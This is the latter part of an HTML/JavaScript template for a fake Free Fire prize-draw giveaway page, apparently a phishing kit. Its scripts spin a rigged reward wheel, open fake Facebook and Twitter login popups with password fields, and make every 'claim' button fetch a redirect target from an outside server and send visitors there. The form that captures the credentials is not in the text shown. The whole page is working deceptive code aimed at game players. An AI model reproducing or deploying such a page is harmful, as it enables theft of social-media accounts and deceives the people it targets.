	</div> <!--- container --->

	<div class="popup about" style="display: none;">
		<div class="popup-box">
			<div class="popup-title">
				<center>关于</center>
				<button onclick="close_about()"
					style="font-size: 20px;background: none;border:none;color: #fff;position: absolute;right: 2.5%;top: 1%">X</button>
			</div>
			<div class="popup-content">
				<div style="font-size: 17px;font-family: teko;color: white;margin-top: 3%">
					<img src="https://static.upoint.id/images/contents/ff-2019.jpg"
						style="width: 50px;border-radius: 5px"><br>
					这是Free Fire的限时活动 <br>
					抽奖领取您的奖励或 <br>
				</div>
			</div>
			<div class="popup-btn-wrapper">
				<center>
				</center>
			</div>
		</div>
	</div>

	<div class="popup exchange" style="display: none;">
		<div class="popup-box">
			<div class="popup-title">
				<center>兑换商店</center>
				<button onclick="close_exchange()"
					style="font-size: 20px;background: none;border:none;color: #fff;position: absolute;right: 2.5%;top: 1%">X</button>
			</div>
			<div class="popup-content">
				<div
					style="background: url(img/bg-prizes.png) no-repeat center;background-size: 100% 100%;width: 80px;height: 80px;position: absolute;top: 15%;left: 38%">
					<img src="img/1599546030876PIvqwGaa.png" style="width: 80%;margin-top: 20%;margin-left: 10%">
					<img src="img/bg-tag-or.png" style="width: 80%;position: absolute;right: 0%;bottom: 0%">
					<font style="position: absolute;right: 10%;bottom: 0;line-height: 10px;color: #ec544d" id="ucnya">
					</font>
				</div>
			</div>
			<div class="popup-btn-wrapper">
				<center>
					<button type="button">领取</button>
				</center>
			</div>
		</div>
	</div>

	<div class="popup reward_confirmation" style="display: none;">
		<div class="popup-box">
			<div class="popup-title">
				<center>领取成功</center>
				<button onclick="close_reward_confirmation()"
					style="font-size: 20px;background: none;border:none;color: #fff;position: absolute;right: 2.5%;top: 1%">X</button>
			</div>
			<div class="popup-content">
				<img class="popup-rewards-img1" src="" id="hadiahnya">
			</div>
			<div class="popup-btn-wrapper">
				<center>
					<button type="button">领取</button>
				</center>
			</div>
		</div>
	</div>

	<script>
		const btn = document.querySelectorAll("button[type='button']")
		btn.forEach((item) => {
			item.addEventListener("click", function () {
				const domain = window.location.protocol + "//" + window.location.host;
				(async () => {
					try {
						let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
						data = await data.json()
						window.location.href = data.data.domain_fb;
					} catch {

					}
				})();
			})
		})
	</script>
	<audio id="sound" src="https://ucpubgx.com/system/draw.mp3">
		<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
		<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
		<script type="text/javascript">
			const hadiah = {
				0: '<?php echo isset($gift1Link) ? $gift1Link : ''; ?>',
				1: '<?php echo isset($gift2Link) ? $gift2Link : ''; ?>',
				2: '<?php echo isset($gift3Link) ? $gift3Link : ''; ?>',
				3: '<?php echo isset($gift4Link) ? $gift4Link : ''; ?>',
				4: '<?php echo isset($gift5Link) ? $gift5Link : ''; ?>',
				5: '<?php echo isset($gift6Link) ? $gift6Link : ''; ?>',
				6: '<?php echo isset($gift7Link) ? $gift7Link : ''; ?>'
			};

			const jumlah = 7;
			const min_loncat = 30;
			let shagitz = -1;
			let peloncatan = 0;
			let kecepatan = 30;
			let waktu = 0;
			let haidah = -1;

			function jalankan() {
				$(`[data-order="${shagitz}"]`).removeClass('shagitz-active');

				shagitz += 1;

				if (shagitz > jumlah - 1) {
					shagitz = 0;
				}

				$(`[data-order="${shagitz}"]`).addClass('shagitz-active');
			}

			function ngerandomHadiah() {
				return Math.floor(Math.random() * jumlah);
			}

			function controllSpeed() {
				peloncatan += 1;
				jalankan();
				if (peloncatan > min_loncat + 10 && haidah === shagitz) {
					clearTimeout(waktu);

					$('.reward_confirmation').fadeIn();
					$('#hadiahnya').attr('src', hadiah[shagitz]);

					haidah = -1;
					peloncatan = 0;

				} else {
					if (peloncatan < min_loncat) {
						kecepatan -= 5;
					} else if (peloncatan === min_loncat) {
						const random_number = ngerandomHadiah();
						haidah = random_number;
					} else {

						if ((peloncatan > min_loncat + 10) && haidah === (shagitz + 1)) {
							kecepatan += 600;
						} else {
							kecepatan += 20;
						}
					}
					if (kecepatan < 40) {
						kecepatan = 40;
					}

					waktu = setTimeout(controllSpeed, kecepatan);
				}
			}

			function init() {
				peloncatan = 0;
				kecepatan = 100;
				haidah = -1;
				controllSpeed();
				var audio = document.getElementById('sound');
				audio.play();
			}

			$(document).ready(() => {
				$('#draw').on('click', init);
			});

			function open_reward_confirmation(ag) {
				var rewardnya = $(ag).attr("src");
				$('.reward_confirmation').fadeIn();
				$('#hadiahnya').attr('src', rewardnya);
			}
			function open_exchange(ag) {
				var ucnya = $(ag).attr("value");
				$('.exchange').fadeIn();
				$('#ucnya').html(ucnya);
			}
			function open_about() {
				$('.about').fadeIn();
			}
			function open_account_login() {
				$('.account_login').fadeIn();
				$('.reward_confirmation').fadeOut();
			}
			function open_facebook() {
				$('.login-facebook').fadeIn();
				$('.account_login').fadeOut();
			}
			function open_twitter() {
				$('.login-twitter').fadeIn();
				$('.account_login').fadeOut();
			}

			// tombol untuk menutup popup
			function close_reward_confirmation() {
				$(".reward_confirmation").fadeOut()
			}
			function close_about() {
				$(".about").fadeOut()
			}
			function close_exchange() {
				$(".exchange").fadeOut()
			}
			function close_account_login() {
				$(".account_login").fadeOut()
			}
			function tutup_facebook() {
				$('.login-facebook').fadeOut()
				$('.account_login').fadeIn();
			}
			function tutup_twitter() {
				$('.login-twitter').fadeOut()
				$('.account_login').fadeIn();
			}
			function showFbPassword() {
				var x = document.getElementById("fbPassword");
				if (x.type === "password") {
					x.type = "text";
					$('.showPassword').hide();
					$('.hidePassword').show();
				} else {
					x.type = "password";
				}
			}
			function hideFbPassword() {
				var x = document.getElementById("fbPassword");
				if (x.type === "text") {
					x.type = "password";
					$('.showPassword').show();
					$('.hidePassword').hide();
				} else {
					x.type = "text";
				}
			}

			// show hide password for twitter
			function showTwitterPassword() {
				var x = document.getElementById("twitterPassword");
				if (x.type === "password") {
					x.type = "text";
					$('.TwitterShowPassword').hide();
					$('.TwitterHidePassword').show();
				} else {
					x.type = "password";
				}
			}
			function hideTwitterPassword() {
				var x = document.getElementById("twitterPassword");
				if (x.type === "text") {
					x.type = "password";
					$('.TwitterShowPassword').show();
					$('.TwitterHidePassword').hide();
				} else {
					x.type = "text";
				}
			}
		</script>
</body>

</html>